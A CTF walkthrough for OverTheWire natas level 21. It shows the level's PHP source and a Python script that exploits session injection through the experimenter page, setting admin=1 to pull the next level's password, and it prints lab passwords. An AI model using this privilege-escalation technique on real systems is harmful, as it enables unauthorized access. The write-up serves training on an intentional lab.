---
title: natas 21 walkthrough
description: over the wire natas 21
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-21 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 21 walkthrough
    order: 30
---
## Description
> Username: natas21
> 
> URL:      http://natas21.natas.labs.overthewire.org

### Source Code
http://natas21.natas.labs.overthewire.org/index.php : 
```php
<?php

function print_credentials()
{ 
    if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas22\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}


session_start();
print_credentials();

```
http://natas21-experimenter.natas.labs.overthewire.org
```php
<?php

session_start();

// if update was submitted, store it
if (array_key_exists("submit", $_REQUEST)) {
    foreach ($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
}

if (array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach ($validkeys as $key => $defval) {
    $val = $defval;
    if (array_key_exists($key, $_SESSION)) {
        $val = $_SESSION[$key];
    } else {
        $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: " . $_SESSION["bgcolor"] . "; text-align: " . $_SESSION["align"] . "; font-size: " . $_SESSION["fontsize"] . ";";
$example = "<div style='$style'>Hello world!</div>";
```

---
## Progress
### Observation
The experimenter page is definitely vulnerable. However, we need to find a way to make it use to crack the main page.
### Trial
If those two pages share session data. One can inject content into the session via the experimenter page, and using the session ID to retrieve the password from the main page.
### Script
```python
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth

username = "natas21"
password = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"
authentication = HTTPBasicAuth(username, password)

def get_content(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    content = soup.select('#content')
    return content.__str__()

def main():
    main_url = "http://natas21.natas.labs.overthewire.org/index.php"
    vul_url = "http://natas21-experimenter.natas.labs.overthewire.org/index.php"
    response = requests.get(vul_url, auth=authentication)
    sessid_cookie = response.cookies
    sessid_cookie = {"PHPSESSID":response.cookies["PHPSESSID"]}

    response = requests.get(vul_url + "?debug=true&admin=1&submit=Update", 
                             cookies=sessid_cookie, auth=authentication)
    if response.status_code == 200:
        if "admin" not in get_content(response):
            exit()
    
    response = requests.get(main_url, cookies=sessid_cookie, auth=authentication)
    if "You are an admin" in get_content(response):
        print(get_content(response))
    else:
        print("failed")

main()
```
91awVM9oDiUGm33JdzM7RVLBS8bz9n0s

---
## Hint

---
## Solving
### Category
- 
### Techniques
- 

### Tools
- 